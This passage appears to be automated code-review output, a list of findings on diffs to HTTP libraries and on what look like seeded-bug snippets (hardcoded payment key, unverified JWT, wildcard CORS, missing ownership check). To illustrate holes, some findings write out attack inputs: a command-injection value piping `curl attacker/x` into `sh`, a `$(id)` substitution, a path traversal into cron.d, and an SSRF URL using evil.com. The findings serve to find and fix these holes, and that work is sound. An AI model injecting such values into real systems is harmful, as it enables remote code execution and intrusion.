Since a malformed `Cookie:` header is entirely client-controlled, any request with a garbage cookie header turns a cookie read into a 500. Keep the dict-like contract on the error path, e.g. reset to a fresh `Cookie.SimpleCookie()` instead of `None` (the on-failure `clear_all_cookies()` side effect is also silently dropped by this move — if that behaviour is wanted it now has to live in the handler).

_Also raised by the security agent:_ Malformed Cookie header makes `request.cookies` None, breaking every request

findings.title: Cookie parsing error path behavior changed with no test to catch it
findings.body: The moved `cookies` property changes what happens when `Cookie.load()` raises: previously (in tornado/web.py) the handler called `self.clear_all_cookies()`, which itself invoked `self.cookies` and would recurse into cookie clearing logic; now it just sets `self._cookies = None`. Any caller that iterates `self.request.cookies` (e.g. `clear_all_cookies` on tornado/web.py line 367, or `get_cookie` on line 321) will raise AttributeError on a malformed Cookie header instead of the previous behavior. No test in this diff exercises a malformed 'Cookie' header, so this regression would not be caught.

findings.title: Incomplete docstring for HTTPRequest.cookies property
findings.body: The docstring states the return type is "A dictionary of Cookie.Morsel objects" but the implementation can return `None` if cookie parsing fails (line 523). A caller reading only the docstring would not expect to receive `None` and could crash when trying to iterate or access keys. The docstring should document this possibility.

findings.title: Missing strip() makes boundary lookup fail for normal headers
findings.body:
`content_type.split(";")` yields parameters with the leading space that RFC-2616/7231 senders conventionally emit, e.g. `"multipart/form-data; boundary=----X"` splits into `["multipart/form-data", " boundary=----X"]`. `field.partition("=")` then gives `k == " boundary"`, which never equals `"boundary"`, so the loop finishes without `break`, the `else` branch logs "Invalid multipart/form-data", and `_parse_mime_body` is never called — every file upload and multipart field is silently discarded. The previous code (`'boundary=' in content_type`) was whitespace-insensitive, so this is a regression for the overwhelmingly common header form; it only works when the sender omits the space after the semicolon.

Fix by normalising each parameter before partitioning, e.g. `k, sep, v = field.strip().partition("=")`, and consider stripping surrounding quotes from `v` since `boundary="..."` is legal.

findings.title: No test covers multipart boundary parsing with non-last boundary field
findings.body: The change fixes a bug where 'boundary' was assumed to be the last field in Content-Type; now it scans all fields via a for-loop with partition. There is no test in the diff exercising a Content-Type header like 'multipart/form-data; boundary=X; charset=Y' (boundary not last) to confirm the fix actually works, nor a regression test for the original bug. If the loop or partition logic were reverted or broken, nothing in the visible change set would catch it.

findings.title: get_host's hand-rolled parsing resolves a different host than urlparse
findings.body:
`get_host` only strips at `://`, `/`, `@` and `:`. It never terminates the authority at `?` or `#`, so the userinfo split on line 94 can consume characters that belong to the query or fragment.

Concrete case: `http://example.com?x=@evil.com` — line 92 finds no `/`, line 94 splits on the first `@` and leaves `url = 'evil.com'`, so the function returns `('http', 'evil.com', None)`. `urlparse`/`urlsplit` on the same string returns netloc `example.com`. Any caller that validates a user-supplied URL with the stdlib parser (SSRF allowlist, "only fetch from our CDN" check) and then hands the original string to urllib3 will have the validation pass on `example.com` while the connection is opened to `evil.com`.

Also note that nothing here rejects control characters: a host containing `\r\n` is returned verbatim, which matters wherever the result is written into the request line or Host header. The sink for that is outside this diff, so I am not raising it separately.

Fix: terminate the authority on `?` and `#` as well as `/` (split on the earliest of them), and reject hosts containing characters outside the allowed host charset — or delegate to `urlsplit` so the parse matches what callers validate against.

findings.title: New util functions with branching logic lack any test coverage
findings.body: make_headers and get_host contain multiple conditional branches (string/list/bool accept_encoding, scheme/port/auth parsing, error raising on non-digit port) but no test file is included in this diff. If these were lifted verbatim from existing tested code elsewhere, this may be fine, but as presented there is no test asserting the documented examples (e.g. make_headers(keep_alive=True, user_agent='Batman/1.0') or get_host('google.com:80')) actually produce the documented output. A refactor that subtly breaks the parsing (e.g. the LocationParseError message missing the %s substitution, or accept_encoding logic) would not be caught.

findings.title: LocationParseError message has an unsubstituted %s placeholder
findings.body: `raise LocationParseError("Failed to parse: %s")` never applies the format argument, so every parse failure surfaces the literal string `Failed to parse: %s` with no indication of which URL was bad — the one piece of information the caller needs to debug it. Change to `raise LocationParseError("Failed to parse: %s" % url)` (or pass the original url, since `url` has already been stripped of scheme/path/auth by this point).

findings.title: is_connection_dropped raises if conn.sock is None
findings.body: `is_connection_dropped` dereferences `conn.sock` unconditionally. An `HTTPConnection` that has been closed (httplib sets `self.sock = None` in `close()`) or never connected will make `select([None], [], [], 0.0)` raise `TypeError` and `p.register(None, POLLIN)` raise as well, instead of reporting the connection as unusable. Guarding with something like `sock = getattr(conn, 'sock', None)` / `if not sock: return False` (or `True`) makes the function total for any connection a pool can hand it. I could not see the callers in connectionpool, so this depends on whether a closed connection can ever be re-checked.

findings.title: New test module references undefined names (no imports shown)
findings.body: The added file is shown in full (`@@ -0,0 +1,6 @@`, six lines) and uses `discount_for`, `Customer` and `Decimal` without importing any of them. As written the module raises `NameError` at collection and both tests error out rather than exercising the extracted helper. Add `from decimal import Decimal` and imports for `discount_for` / `Customer` (or the fixture that supplies them). If these names are injected by a `conftest.py` that I wasn't shown, ignore this.

findings.title: No test exercises describe() for either event kind
findings.body: The change removes redundant casts but relies on TypeScript's control-flow narrowing to keep `event.x` and `event.code` correctly typed. There is no test file in this diff verifying `describe()` returns the expected string for both 'click' and 'key' event kinds, so a mistake in the narrowing (e.g. wrong property name, wrong branch) would only be caught by the type checker, not by a runtime test.

findings.title: `HTTPMove.location` now returns a URL object, not the original string
findings.body:
Previously `self.location` was assigned the raw `location` argument; now it is assigned `URL(location)`. The documented contract (docs/web_reference.rst) states that `HTTPMove.location` is "the location the response redirects to, **as the string it was constructed with**", and that application code compares it against configured strings and passes it to `str.startswith`. A `yarl.URL` has no `startswith` method and will not compare equal to a plain string, so existing callers doing `exc.location.startswith("/admin")` will raise `AttributeError` and `exc.location == "/login"` will silently become `False`. Additionally `URL(location)` normalises/quotes the input, so even `str(exc.location)` may not round-trip the original string.

If the goal is just to avoid constructing the URL twice, keep the public attribute as the string and use a local variable:

```python
url = URL(location)
self.headers['Location'] = str(url)
self.location = location
```

_Also raised by the security agent:_ `location` type change can break string-based redirect allowlist checks

findings.title: location attribute now stores URL object, contradicts documentation
findings.body: The documentation in `docs/web_reference.rst` explicitly states that `HTTPMove.location` is 'the string it was constructed with', and that 'Application code compares it against configured strings and passes it to `str.startswith`'. After this change, `self.location` is now a `URL` object, not a string. Code that previously received a string and called `str.startswith()` on it will now fail. Either the documentation must be updated to reflect that `location` is now a `URL` object, or the implementation should be reverted to store the original string.

findings.title: No test guards location's documented string type/value
findings.body: `self.location` is now assigned `URL(location)` instead of the original string, which contradicts the documented contract ("as the string it was constructed with", used with `str.startswith`). This diff includes no test asserting `resp.location == location` or `isinstance(resp.location, str)`, so this behavior-changing regression would go undetected by the test suite.

findings.title: readany can return b'' before EOF after while→if change
findings.body:
`_wait()` is documented to resolve not only on `feed_data()`/`feed_eof()` but also "at the end of a chunk, which can happen with no new data in the buffer", and it explicitly requires that "a caller must re-check its condition after waking rather than assuming data arrived". Replacing the `while` with an `if` removes exactly that re-check: after a chunk-boundary wakeup with an empty buffer and `_eof` still false, control falls through to `self._read_nowait(-1)` on line 8, which returns an empty result.

Callers of `readany()` conventionally loop with `chunk = await resp.content.readany(); if not chunk: break`, so an empty return before EOF is interpreted as end-of-stream and silently truncates the body. Restore the loop (`while not self._buffer and not self._eof:`) so the condition is re-evaluated after every wake, or otherwise guarantee that `_wait` only resolves when data or EOF is actually present.

_Also raised by the security agent:_ Single wait can return b"" early, which callers may treat as EOF

findings.title: No test covers spurious-wakeup behavior for readany()
findings.body: The docstring for _wait explicitly warns that the waiter can be resolved 'at the end of a chunk, which can happen with no new data in the buffer,' so callers must re-check their condition after waking. Changing the while-loop to a single if means readany() will now return whatever _read_nowait produces immediately after a single wake, even if the buffer is still empty and eof hasn't happened — potentially returning an empty read prematurely. No test in this diff exercises a spurious wake-without-data scenario to catch this regression if it's wrong.

findings.title: `from adapters import HTTPAdapter` breaks package-internal resolution
findings.body: `requests/adapters.py` is a submodule of the `requests` package, not a top-level module. Under Python 3 (and under Python 2 with `from __future__ import absolute_import`), `from adapters import HTTPAdapter` is an absolute import and will raise `ModuleNotFoundError: No module named 'adapters'` as soon as `requests.sessions` is imported — i.e. on `import requests` for any consumer. Even on legacy Python 2 where implicit relative imports resolve, this form would silently prefer a top-level `adapters` module if one exists on `sys.path`, binding the wrong `HTTPAdapter`. This is not an equivalent "cleaner form"; restore `from .adapters import HTTPAdapter`.

findings.title: Absolute `from adapters import HTTPAdapter` allows module hijack of the transport layer
findings.body:
`from .adapters import HTTPAdapter` unambiguously resolves to `requests/adapters.py`. `from adapters import HTTPAdapter` resolves through `sys.path`: under Python 2 it happens to fall back to the sibling module, but under Python 3 (and under Python 2 with `absolute_import` in effect) it is a top-level lookup. Any `adapters.py` reachable earlier on `sys.path` — `sys.path[0]` is the script's directory or, for `python -c`/interactive use, the current working directory, plus any site-packages distribution that happens to own the top-level name `adapters` — is imported instead.

Adversary: anyone who can place a file into a directory on the importing process's `sys.path` (a shared or world-writable working directory, a CI checkout, an unprivileged user in a service's cwd), or who publishes a PyPI package claiming the unowned top-level name `adapters`. What they control: the entire body of the substituted module, which executes at import time, and the `HTTPAdapter` class that `Session` will use for every outbound request. What they get: arbitrary code execution in the importing process and full control of the HTTP transport — certificate verification, proxying, and request/response bodies, i.e. credential capture and silent MITM of every call made through `requests`.

Restore the explicit relative form `from .adapters import HTTPAdapter`; it is the same module with no ambiguity in resolution.

findings.title: Dropped None guard: `name in self.request.cookies` raises on unparsable Cookie header
findings.body:
The PR description asserts "cookies is always a mapping after construction", but the retrieved `HTTPRequest.cookies` property documents and implements the opposite: it returns `None` when the Cookie header is present but cannot be parsed (`if self._cookies is None: return None`), and its docstring states "every consumer has to allow for that".

With the guard removed, any request carrying a malformed Cookie header will make `name in self.request.cookies` raise `TypeError: argument of type 'NoneType' is not iterable` inside `get_cookie`. Since `get_cookie` is called from handler code (and typically from auth/session paths such as `get_current_user`), this turns a client-supplied malformed header into a 500 error — a trivially reachable remote input.

Either restore the `self.request.cookies is not None and ...` guard, or change the `cookies` property to return an empty mapping instead of `None` (and update its docstring plus all other consumers) before simplifying here.

findings.title: Code change contradicts documented behavior of cookies property
findings.body: The `get_cookie` method now assumes `self.request.cookies` is never None by removing the None check on line 3. However, the `cookies` property in `tornado/httpserver.py` is documented as: 'Set to None when the Cookie header is present but cannot be parsed, so every consumer has to allow for that.' This means callers following the documented API contract will encounter a TypeError (cannot use `in` operator on None) instead of the graceful fallback behavior.

findings.title: Removed None guard lets a malformed Cookie header crash any handler
findings.body:
`self.request.cookies` is documented to return `None` when the `Cookie` header is present but unparseable (see `tornado/httpserver.py` property docstring: "Set to None when the Cookie header is present but cannot be parsed, so every consumer has to allow for that"). With the guard removed, `name in self.request.cookies` evaluates `in` against `None` and raises `TypeError: argument of type 'NoneType' is not iterable`.

Adversary: any unauthenticated remote client. What they control: the raw `Cookie` request header. What they get: an unhandled exception (HTTP 500) on every request path that calls `get_cookie`, including login/session and XSRF-token handlers — a trivially reproducible, zero-cost denial of service against cookie-reading endpoints, plus a stack-trace/500 in logs for each request.

Restore the guard, or normalise the contract at the source so `cookies` returns an empty mapping instead of `None` (and update the `httpserver.py` docstring accordingly) before simplifying consumers.

findings.title: Docstring does not reflect changed behavior with None cookies
findings.body: The docstring 'Gets the value of the cookie with the given name, else default' no longer accurately describes behavior when cookies is None. With the simplified implementation, the method will raise TypeError instead of returning the default value when cookies cannot be parsed. The docstring should be updated to document this breaking change, or the code should restore the None check.

findings.title: No test covers get_cookie when request.cookies is None
findings.body: The repository's own documentation for `cookies` (tornado/httpserver.py) states it is set to None when the Cookie header is present but cannot be parsed, meaning every consumer must allow for that. This diff removes the `self.request.cookies is not None` guard in `get_cookie`, changing behavior from returning `default` to raising a TypeError (`'NoneType' object is not iterable` from `in`) when cookies is None. There is no test in this diff exercising get_cookie with an unparsable/None cookies value, so this behavior change would go undetected if it is wrong.

findings.title: Dropping strip() breaks boundary parsing for standard headers
findings.body: `content_type.split(";")` leaves the leading space that virtually every client emits in `multipart/form-data; boundary=----X`. Without `field.strip()`, the second element is `" boundary=----X"`, so `k` is `" boundary"` and the `k == "boundary"` test on line 5 never matches. The loop then falls through without ever calling `_parse_mime_body`, so multipart request bodies are silently discarded (no files, no form arguments) with no error raised. Trailing whitespace/CRLF on the value is likewise no longer trimmed, so even when a client sends `;boundary=x` with no space, `v` can carry stray whitespace into `_parse_mime_body`. Restore the strip: `k, sep, v = field.strip().partition("=")` (and keep stripping `v` if the original code did so).

findings.title: Dropping strip() makes boundary parsing whitespace-sensitive and attacker-steerable
findings.body:
`field.partition("=")` is now applied to the raw semicolon-separated segment. For the canonical header `Content-Type: multipart/form-data; boundary=abc` the segment is `" boundary=abc"`, so `k` is `" boundary"` and the `k == "boundary"` test on line 5 fails: no boundary is found, `_parse_mime_body` is never called, and the body is silently discarded (no error is raised in this branch). Only the unusual no-space form `;boundary=abc` still parses.

Beyond the functional break, the whitespace handling is now something the remote client chooses. Entry point: the `Content-Type` request header, attacker-controlled on any request. Sink: the boundary delimiter passed to `_parse_mime_body` on line 6. An attacker can (a) suppress body parsing entirely by using the spaced form, so server-side logic that expects fields/files sees none, and (b) with the unspaced form supply a value carrying trailing whitespace (`;boundary=abc `), which is retained here but stripped by RFC-2231/7578-conformant parsers in front-of-app proxies, WAFs or log/scanner pipelines — the two tiers then split the same body on different delimiters, which is the classic shape of a multipart parser differential used to slip parts past an inspecting intermediary.

Restore `field.strip().partition("=")` (and keep stripping the value) so parsing matches the header grammar, where whitespace around parameters is insignificant.

findings.title: No test covers boundary parsing with whitespace-padded fields
findings.body: The diff removes field.strip() before partition, meaning k will now retain leading whitespace (e.g. ' boundary' instead of 'boundary') for the common header format 'multipart/form-data; boundary=xyz' which has a space after the semicolon. This would break the k == "boundary" comparison and silently fail to find the boundary. No test in this change exercises this code path with a realistic space-separated content-type header, so this regression would not be caught.

findings.title: Malformed port error path has no test coverage
findings.body: The change to `raise LocationParseError("Failed to parse: %s")` removes the `% url` substitution, so this line will now raise a TypeError (missing format argument) instead of the intended LocationParseError whenever port parsing fails. No test in this diff exercises the non-digit port path, so this regression would not be caught by the test suite.

findings.title: Format placeholder left unsubstituted in LocationParseError message
findings.body: The `% url` operand was removed but the `%s` placeholder was kept, so the exception message is the literal string `"Failed to parse: %s"`. Callers and logs now see a raw format specifier and lose the URL that failed to parse — the one piece of information the message existed to convey. If the intent is to shorten the message, drop the placeholder too (e.g. `LocationParseError("Failed to parse")`); if the URL should still be reported, restore `% url`.

findings.title: Command injection via shell=True in create_archive
findings.body:
`create_archive` formats `name` and `directory` directly into a command string and executes it with `shell=True`. Either parameter can carry shell metacharacters: `create_archive("a; curl attacker/x | sh #", d)` or a `directory` of `"$(id)"` runs arbitrary commands as the service user. A `name` of `../../etc/cron.d/x` also escapes `/exports` and writes an attacker-chosen path, since the prefix is plain text concatenation with no normalisation.

Fix by using the argument-list form the sibling function already uses:

    subprocess.run(["tar", "-czf", f"/exports/{name}.tar.gz", directory], check=True)

and additionally reject or sanitise `name` (e.g. allow `[A-Za-z0-9_-]+` only, or `os.path.basename`) so it cannot traverse out of `/exports`, since the list form stops shell interpretation but not path traversal.

_Also raised by the correctness agent:_ Unquoted f-string into shell=True breaks on spaces/metacharacters

findings.title: No test coverage for create_archive shell command construction
findings.body: create_archive builds a shell command string via f-string interpolation of name and directory and executes it with shell=True. There is no test exercising this function, so a regression (e.g. broken quoting, wrong path, or a change in escaping behavior) would not be caught. At minimum a test should assert that the resulting tarball is created with expected contents/name for a given directory, and that special characters in name/directory are handled as intended.

findings.title: origin "*" with credentials:true is rejected by browsers and unsafe
findings.body:
`cors({ origin: "*", credentials: true })` emits `Access-Control-Allow-Origin: *` together with `Access-Control-Allow-Credentials: true`. The Fetch spec forbids this pairing: for a request made with `credentials: "include"`, a literal `*` in `Access-Control-Allow-Origin` fails the CORS check and the browser blocks the response. So this change does not accomplish its stated goal \u2014 the dashboard still cannot call the API with cookies.

The workaround people usually reach for next (reflecting the request `Origin` header) is worse: it makes every site on the internet an allowed credentialed origin, so any page a logged-in user visits can read authenticated API responses.

Fix by doing what line 6 already does \u2014 add the dashboard origin to `ALLOWED` and reuse the existing configured `cors` instance, or pass an explicit allow-list/predicate to `origin` here rather than `"*"`.

findings.title: Wildcard CORS origin combined with credentials: true
findings.body:
`dashboardCors` sets `origin: "*"` together with `credentials: true`, abandoning the `ALLOWED` allowlist used by the existing middleware on line 6. Any origin on the internet is admitted.

Adversary: the operator of any website a logged-in user visits. What they control: a page that issues `fetch(API_URL, { credentials: 'include' })`. What they get: the request rides the victim's session cookie, and the policy declares the response readable by the caller's origin — a cross-origin read of authenticated API data plus state-changing requests with no origin check to stop them.

Note on the exact primitive: with the `cors` package, `origin: "*"` emits the literal `Access-Control-Allow-Origin: *`, and browsers refuse to expose a credentialed response under a literal wildcard, so the read half may be blocked today by browser enforcement alone. That is a browser-side accident, not a control in your code: the moment this is changed to a reflecting form (`origin: true`, a regex, or a callback), or the middleware is fronted by anything that normalises the header to the request origin, the read becomes live. The server-side origin check is switched off either way.

Fix: give the dashboard its own explicit origin (or add it to `ALLOWED`) rather than `"*"`, and keep `credentials: true` only alongside an exact-match allowlist.

findings.title: No test exercises dashboardCors behavior
findings.body: The new `dashboardCors` middleware combines a wildcard origin with credentials:true, an unusual and consequential combination. There is no test in this diff verifying the resulting response headers (e.g., Access-Control-Allow-Origin/Allow-Credentials) for a sample request, so a future change that 'fixes' or alters this config would not be caught by any existing suite.

findings.title: Live AcmePay secret key hardcoded in source
findings.body:
`ACMEPAY_SECRET_KEY` is a literal `acme_live_...` credential committed to the repository, and it replaces the previous `os.environ["ACMEPAY_SECRET_KEY"]` lookup (the `import os` line is deleted). Anyone with read access to this repo — or to any clone, CI log, container image, or fork — obtains a production payments credential and can issue charges and refunds against the merchant account.

Restore the environment lookup (or a secrets-manager fetch), remove the literal, and treat this key as compromised: rotate it at AcmePay and purge it from git history, since removal in a later commit does not remove it from the object store.

findings.title: Env-var credential lookup replaced by a hardcoded live key
findings.body: `client()` previously read `os.environ["ACMEPAY_SECRET_KEY"]`, which (a) let each environment supply its own credential and (b) failed loudly with a `KeyError` when the credential was missing. After this change the module-level constant `ACMEPAY_SECRET_KEY` is always assigned to `acmepay.api_key`, so any `ACMEPAY_SECRET_KEY` already set in staging/CI/dev deployment configuration is ignored and those environments will authenticate against the live account (`acme_live_...`) — real charges from non-production code paths. The `import os` removal makes the override impossible rather than merely unused. Restore the environment lookup (optionally with an explicit, non-live default or a clear failure when unset) and keep the secret out of the source tree.

findings.title: client() behavior change has no covering test
findings.body: client() previously pulled the API key from os.environ and now uses a hardcoded module constant. The only test-related file touched, tests/fixtures/acmepay.py, defines a fake_client() fixture but contains no test function or assertion that calls billing.acmepay_client.client() and checks what api_key it sets. As written, nothing in the diff would fail if this function were wrong (e.g., if the wrong key were assigned, or if the assignment were dropped entirely).

findings.title: fake_client() return shape does not match client()
findings.body: `client()` returns the `acmepay` module, whose credential is reached as an attribute (`acmepay.api_key`). `fake_client()` returns a plain dict `{"api_key": TEST_KEY}`, which supports `["api_key"]` but not `.api_key` and none of the module's charge/API functions. Any test that substitutes this fixture for the real client will either fail with `AttributeError` or exercise a shape production code never sees. Consider returning a small stub object exposing `api_key` as an attribute and the methods under test. I could not see the consuming tests, so this may be intentional for a dict-based assertion.

findings.title: tenant_of returns a tenant id from an unverified token
findings.body:
`tenant_of` calls `jwt.decode(..., options={"verify_signature": False})`, so the returned `tenant_id` comes from a token body that was never checked against `public_key()` and whose `exp`/`aud` claims are also unvalidated (PyJWT skips claim validation when signature verification is off). Any caller that uses this value to scope a query or a permission check will honour a tenant id that the caller of the API chose for themselves \u2014 a forged or edited token yields cross-tenant access. Derive the tenant from the verified claims instead, e.g. `return claims_for(token)["tenant_id"]`, and keep the unverified decode only for non-security-bearing uses such as picking a key id before verification.

_Also raised by the security agent:_ tenant_id read from unverified JWT enables cross-tenant access

findings.title: New tenant_of() function has no accompanying test
findings.body: tenant_of() is a new, security-sensitive function (it decodes a JWT with verify_signature=False and trusts the tenant_id claim). No test file is included in this diff, so there is nothing that would catch a regression such as the function throwing on a missing 'tenant_id' key, returning the wrong value, or someone later 'fixing' it to verify the signature and breaking callers that expect a specific behavior. Since this is new logic with a non-obvious trust decision, it should have at least one test exercising a valid token and a malformed/missing-claim token.

findings.title: Unguarded dict index raises KeyError for tokens without tenant_id
findings.body: A token that decodes successfully but carries no `tenant_id` claim makes line 12 raise `KeyError`, which is not an auth-shaped error and will surface as a 500 rather than a 401/403 unless a caller happens to catch it. Since verification is disabled, a caller can trivially present such a token. Use `unverified.get("tenant_id")` and handle the missing case explicitly, or raise the module's own auth error.

findings.title: Public function lacks documentation of security model
findings.body: The `tenant_of()` function is a public API that reads tenant information from an unverified JWT token. Callers need to understand that this function intentionally skips signature verification and returns data that has not been authenticated. Without documentation, a caller could mistakenly assume the tenant_id has been validated, leading to authorization bugs. Add a docstring explaining the function reads unverified claims and when it is safe to use.

findings.title: Missing require_owner check lets any user edit others' payment methods
findings.body:
`update_payment_method` resolves `pm` directly from the caller-supplied `pm_id` (line 12) and writes to it (lines 13-14) without ever calling `require_owner`. The retrieved `api/auth.py` states plainly that `current_user` is "Authentication only — never authorisation" and that "Every object mutation must call" `require_owner`; the read-only handler two lines above (line 6) does exactly that, so the omission here is inconsistent within the same file.

Fix: after fetching, call `require_owner(user, pm)` before assigning any fields, e.g.

```python
user = current_user(request)
pm = PaymentMethod.get(pm_id)
require_owner(user, pm)
pm.billing_name = body["billing_name"]
```

Note that `user` is currently bound on line 11 and never used, which is a strong signal the ownership check was intended and dropped.

_Also raised by the correctness agent:_ update_payment_method mutates without require_owner; `user` is unused

_Also raised by the correctness agent:_ Unguarded body["billing_name"] raises KeyError on a malformed request

findings.title: Public API violates documented authorization pattern
findings.body: The function `update_payment_method` mutates a `PaymentMethod` object without calling `require_owner()`, which violates the explicit contract documented in the repository context: 'Every object mutation must call this.' The existing `get_payment_method()` above this function demonstrates the required pattern. A caller could reasonably expect this new update function to enforce the same authorization, since the prior function in the same module does so for read access.

findings.title: No test covers update_payment_method, including missing ownership check
findings.body: update_payment_method is a new endpoint that mutates state but has no accompanying test. Notably it omits the require_owner(user, pm) call that the adjacent get_payment_method (lines 5-7) performs, meaning any authenticated user could update another user's payment method. A test asserting that a non-owner request is rejected (analogous to whatever test presumably exists for get_payment_method's require_owner check) would have caught this immediately.

findings.title: Password reset endpoint left with no rate limit
findings.body:
`@rate_limit("5/hour")` was the only throttle in front of `request_reset`, which takes an attacker-supplied `email` and passes it straight to `send_reset_email`. With it gone, an unauthenticated caller can loop on this endpoint to (a) flood a chosen victim's inbox with reset mails, hoping to bury other mail or push the victim into clicking, (b) burn the mail provider's quota and sender reputation for every user, and (c) generate reset tokens at high volume, which raises the value of any weakness in token generation or expiry.

The stated justification — that the email provider throttles — does not cover this case: provider-side throttling is applied per sending account or per outbound volume, not per target address or per client IP, so a single victim can still be targeted at whatever rate the provider will accept, and once that ceiling is hit it degrades reset mail for every other user too.

If the limiter must move, replace it with an equivalent control at the boundary (per-IP and per-target-email counters, or a short cooldown keyed on the email before `send_reset_email` is called) rather than removing it outright.

findings.title: No test guards against reintroducing/removing rate limiting on reset
findings.body: The @rate_limit decorator was removed from request_reset with no accompanying test change. If this removal is wrong (e.g. the email provider's throttling is insufficient or absent for some code paths), nothing in the visible codebase would fail to catch it — there's no test asserting request_reset is or isn't rate-limited. A test exercising repeated calls to request_reset and asserting on throttling behavior (or explicitly documenting reliance on the provider) would catch a regression here.

findings.title: Handler reports {"sent": True} even when provider throttling drops the mail
findings.body: The PR justifies removing the per-caller limiter by saying "the email provider already throttles".
